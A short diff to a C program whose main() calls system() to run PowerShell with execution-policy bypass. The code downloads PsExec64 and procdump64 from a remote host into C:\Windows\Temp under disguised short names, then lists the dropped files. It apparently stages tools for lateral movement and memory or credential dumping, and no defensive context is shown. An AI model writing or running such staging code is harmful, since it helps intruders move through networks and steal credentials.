@@ -9,7 +9,9 @@ int main(int c, char *argv[]){
 	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','C:\\Windows\\Temp\\pe.exe')) } \"");
 	printf("ps.exe downloaded, downloading pd.exe\n");
 	system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/procdump64.exe','C:\\Windows\\Temp\\pd.exe')) } \"");
-	printf("pd.exe downloaded");
+	printf("pd.exe downloaded. listing files");
+	system("ls C:\\Windows\\Temp\\pe.exe");
+	system("ls C:\\Windows\\Temp\\pd.exe");
 
 
 	getchar();
